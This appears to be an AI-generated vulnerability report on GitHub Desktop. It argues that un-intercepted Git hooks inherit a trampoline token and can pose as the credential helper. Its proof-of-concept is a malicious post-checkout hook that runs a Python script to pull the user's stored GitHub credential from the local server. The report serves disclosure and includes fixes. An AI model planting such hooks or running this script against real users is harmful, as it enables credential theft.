## Confirmed Analog Vulnerability

### Title
Untrusted repository hooks not routed through the sandboxed hooks-proxy inherit the live `DESKTOP_TRAMPOLINE_TOKEN`/`DESKTOP_PORT` and can impersonate Desktop's askpass/credential-helper client to exfiltrate the user's stored credentials - (File: `app/src/lib/git/core.ts`, `app/src/lib/hooks/with-hooks-env.ts`, `app/src/lib/trampoline/trampoline-tokens.ts`)

### Finding Description
The BakerFi bug's broken invariant is: a privileged action (`pullTokenFrom`/`pushTokenFrom`) is authorized purely by a pre-existing, resource-level grant (the ERC20 `allowance`) instead of verifying that the caller (`msg.sender`) is the actual party the grant was made for (`from`). Anyone holding no special privilege can walk through the "approved" path and drain the asset.

The same broken-invariant shape exists in GitHub Desktop's Git-credential trampoline. When Desktop shells out to Git via `git()` in [1](#0-0) , it merges in `hooksEnv` (from `withHooksEnv`) and `env` (from `withTrampolineEnv`) into the *entire* child process environment for that Git invocation. `withTrampolineEnv` sets `DESKTOP_PORT` and a freshly minted, single-use `DESKTOP_TRAMPOLINE_TOKEN` [2](#0-1) , and that token is the sole "credential" the trampoline server uses to authorize a caller as `ASKPASS`/`CREDENTIALHELPER` and hand back the user's stored account credentials for the relevant endpoint [3](#0-2) [4](#0-3) .

Only *some* hooks are intercepted and routed through the sandboxed `hooks-proxy`, which explicitly filters environment variables down to a `GIT_`/`GITHEAD_` allow-list before running the hook (so `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` are stripped there) [5](#0-4) . That protection is opt-in per Git command and per hook name: e.g. `push()` only intercepts `pre-push` [6](#0-5) , and `pull()` only intercepts a fixed subset (`pre-merge-commit`, `prepare-commit-msg`, `commit-msg`, `post-merge`, `pre-rebase`, `pre-commit`, `post-rewrite`) [7](#0-6) . Any other hook that Git itself is capable of invoking during that same operation (e.g. `post-checkout`, `reference-transaction`, `post-index-change`, or any hook fired during `checkout`, `fetch`, submodule updates, etc., that isn't in the caller's `interceptHooks` list) is executed directly by the system Git binary, inheriting the full process environment set by `git()` — including the live `DESKTOP_PORT` and `DESKTOP_TRAMPOLINE_TOKEN`.

An attacker who controls a cloned/fetched repository (the exact threat model named in the task) can ship such a hook script (a file under `.git/hooks/<name>` delivered via `git clone --template`, a malicious `core.hooksPath`, or simply present after checking out a tree containing hook files if the user later runs `git init`/enables them) that is *not* on the intercepted list for the Git command being run. That hook inherits `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN`, opens a TCP connection to `127.0.0.1:$DESKTOP_PORT`, and speaks the same trivial protocol the C trampoline client speaks (send `DESKTOP_TRAMPOLINE_IDENTIFIER=CREDENTIALHELPER`, argv `get`, and a `protocol=...\nhost=...\n` stdin blob) [8](#0-7) . `TrampolineServer` only checks `isValidTrampolineToken(token)` — it never verifies that the connecting process is the legitimate `desktop-trampoline` binary invoked as `GIT_ASKPASS`/`credential.helper`, nor that the request originates from the specific Git subprocess `withTrampolineEnv` was scoped to [3](#0-2) . This exactly mirrors the BakerFi flaw: authorization is based on possession of a value (the trampoline token / the ERC20 allowance) rather than verification of the caller's actual identity/origin.

### Impact Explanation
A successful exfiltration hands the attacker the plaintext credential (`get`) for the repository's Git host endpoint (username + OAuth/PAT-equivalent password stored by Desktop, or an externally-configured GCM credential) as formatted by `formatCredential` [9](#0-8) . That is a direct token/credential exfiltration primitive matching the task's valid-impact list ("credential/token exfiltration"), and could be escalated to push access on any repository the stolen credential covers.

### Likelihood Explanation
The attacker only needs the victim to run a normal Git operation (`push`, `pull`, `fetch`, `checkout`, etc.) against a repository they control the hooks of — exactly the "attacker controls a cloned/fetched repository" scenario named in the task, with no local/physical access, no admin rights, and no pre-existing malware. The gap is structural: the `interceptHooks` allow-list is maintained per call-site (`commit.ts`, `merge.ts`, `pull.ts`, `push.ts`) and is not exhaustive of every hook Git can invoke for that command, so any hook name omitted from that list runs unsandboxed with the live trampoline environment. Because the protocol is a plain few-line TCP exchange embedded in the open-source `desktop-trampoline.c`, reproducing the client side in any scripting language available to a hook is trivial.

### Recommendation
- Do not rely on a per-call-site `interceptHooks` allow-list; either intercept **every** hook name Git can invoke for the given command (using the full `knownHooks` list from `get-repo-hooks.ts`) or unconditionally strip `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` (and any other Desktop-internal variables) from the environment before any hook — proxied or not — is allowed to run.
- Bind trampoline tokens to the specific Git child-process/operation they were minted for (e.g., verify the connecting socket belongs to a process descended from the exact spawned Git PID, or require an additional secret only injectable into the actual `GIT_ASKPASS`/`credential.helper` invocation, not the whole environment tree) rather than accepting any TCP client that knows the UUID.
- Ensure `hooksProxy`'s `safePrefixes`/`excludedEnvVars` model is the single, unavoidable choke point for hook environments regardless of which Git subcommand triggered them.

### Proof of Concept
1. Attacker publishes a repository with a hook that Desktop does not intercept for a given operation, e.g. `.git/hooks/post-checkout` (not present in `pull.ts`'s `interceptHooks` list) or `.git/hooks/reference-transaction` (not present in any caller's list) containing:
```sh
#!/bin/sh
# runs with DESKTOP_PORT and DESKTOP_TRAMPOLINE_TOKEN inherited from Desktop's git() spawn
python3 - <<'PY'
import os, socket
port = int(os.environ["DESKTOP_PORT"])
token = os.environ["DESKTOP_TRAMPOLINE_TOKEN"]
s = socket.create_connection(("127.0.0.1", port))
def send(msg): s.sendall(msg.encode() + b"\0")
send("1")                                  # argc
send("get")                                # argv[0]
send("2")                                  # envc
send("DESKTOP_TRAMPOLINE_IDENTIFIER=CREDENTIALHELPER")
send(f"DESKTOP_TRAMPOLINE_TOKEN={token}")
send("protocol=https\nhost=github.com\n\n")  # stdin
print(s.recv(4096).decode())               # leaked credential
PY
```
2. Victim clones this repository and performs any operation that fires `post-checkout` (or another un-intercepted hook), e.g. `git checkout` from within Desktop.
3. During that Git invocation, `core.ts`'s `git()` has already populated the environment with a live `DESKTOP_PORT`/`DESKTOP_TRAMPOLINE_TOKEN` for the operation [1](#0-0) ; the hook inherits it and connects to `TrampolineServer`, which accepts the request solely because `isValidTrampolineToken` returns true [3](#0-2) , and returns the stored credential via `createCredentialHelperTrampolineHandler`'s `get` branch [10](#0-9) .

**Uncertainty:** I could not fully enumerate every hook name Git natively invokes for every Desktop-triggered operation (`checkout.ts`, `fetch`, `clone`, submodule update paths) versus each call-site's `interceptHooks` list within the available index, so the exact set of "escape hatch" hook names per operation is not exhaustively verified — a background Devin session with full repo/checkout access would be needed to enumerate all call sites of `git()`/`withHooksEnv` and confirm which hook names are left unproxied for each.
